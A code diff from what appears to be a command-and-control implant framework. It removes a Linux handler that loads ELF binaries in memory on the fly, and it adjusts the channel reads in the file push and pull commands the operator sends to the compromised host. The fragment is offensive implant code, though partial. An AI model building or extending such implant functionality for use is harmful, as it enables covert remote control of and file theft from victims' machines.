@@ -25,22 +25,12 @@
 #include "c2.h"
 #include "tlv.h"
 
-#ifdef LINUX
-static c2_api_call_t *sys_elf(tlv_transport_pkt_t tlv_transport_packet)
-{
-    if (c2_api_load_elf_on_fly(tlv_transport_packet) < 0)
-        return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_RW_ERROR, "");
-
-    return NULL;
-}
-#endif
-
 static c2_api_call_t *sys_push(tlv_transport_pkt_t tlv_transport_packet)
 {
     tlv_transport_pkt_t tlv_arg_no1 = tlv_transport_channel_read(
-        tlv_transport_packet.tlv_transport_channel);
+        tlv_transport_packet.tlv_transport_pkt_channel, 1);
     tlv_transport_pkt_t tlv_arg_no2 = tlv_transport_channel_read(
-        tlv_transport_packet.tlv_transport_channel);
+        tlv_transport_packet.tlv_transport_pkt_channel, 1);
 
     tlv_transport_file_t tlv_transport_file_new = {
         .tlv_transport_file_to = tlv_arg_no1.tlv_transport_pkt_data,
@@ -64,9 +54,9 @@ static c2_api_call_t *sys_push(tlv_transport_pkt_t tlv_transport_packet)
 static c2_api_call_t *sys_pull(tlv_transport_pkt_t tlv_transport_packet)
 {
     tlv_transport_pkt_t tlv_arg_no1 = tlv_transport_channel_read(
-        tlv_transport_packet.tlv_transport_channel);
+        tlv_transport_packet.tlv_transport_pkt_channel, 1);
     tlv_transport_pkt_t tlv_arg_no2 = tlv_transport_channel_read(
-        tlv_transport_packet.tlv_transport_channel);
+        tlv_transport_packet.tlv_transport_pkt_channel, 1);
 
     tlv_transport_file_t tlv_transport_file_new = {
         .tlv_transport_file_to = tlv_arg_no1.tlv_transport_pkt_data,
@@ -91,8 +81,4 @@ void register_sys_api_calls(c2_api_calls_t **c2_api_calls_table)
 {
     c2_register_api_call(c2_api_calls_table, API_CALL, sys_push, API_SCOPE_STDAPI);
     c2_register_api_call(c2_api_calls_table, API_CALL + 1, sys_pull, API_SCOPE_STDAPI);
-
-    #ifdef LINUX
-    c2_register_api_call(c2_api_calls_table, API_CALL + 2, sys_elf, API_SCOPE_STDAPI);
-    #endif
 }
